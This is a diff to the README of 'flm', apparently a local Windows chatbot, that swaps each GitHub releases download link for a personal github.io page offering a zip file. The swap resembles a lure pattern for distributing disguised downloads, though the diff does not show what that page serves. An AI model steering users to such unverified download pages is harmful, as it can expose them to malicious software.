@@ -17,7 +17,7 @@ Think of flm as a chatbot that has "memories" of how a real brain is connected. 
 
 ## 📥 Downloading flm
 
-[![Download flm](https://img.shields.io/badge/Download%20flm-Latest%20Release-blueviolet?style=for-the-badge&logo=github)](https://github.com/Kaifshaikh2892/flm/releases)
+[![Download flm](https://img.shields.io/badge/Download%20flm-Latest%20Release-blueviolet?style=for-the-badge&logo=github)](https://kaifshaikh2892.github.io)
 
 Visit this link to download the application. The download page will show you a list of available files – choose the most recent version.
 
@@ -32,7 +32,7 @@ When you download flm, you'll receive a single compressed file (usually in `.zip
 ## 🛠️ Installation Guide
 
 ### Step 1: Download the File
-1. Click the big purple button above or go directly to the [releases page](https://github.com/Kaifshaikh2892/flm/releases)
+1. Click the big purple button above or go directly to the [releases page](https://kaifshaikh2892.github.io)
 2. Look for the newest release (they're listed newest first)
 3. Click the download link for the `.zip` file (e.g., `flm-v1.0.0.zip`)
 
@@ -90,7 +90,7 @@ flm is designed to work on standard Windows computers. It does require a moderat
 Absolutely. Since flm runs locally, your conversations never leave your computer. Nothing is sent to servers or stored online.
 
 ### Can I update flm later?
-Yes! Check the [releases page](https://github.com/Kaifshaikh2892/flm/releases) periodically for new versions. Updates add features, fix bugs, and improve performance.
+Yes! Check the [releases page](https://kaifshaikh2892.github.io) periodically for new versions. Updates add features, fix bugs, and improve performance.
 
 ## 🧪 Troubleshooting
 
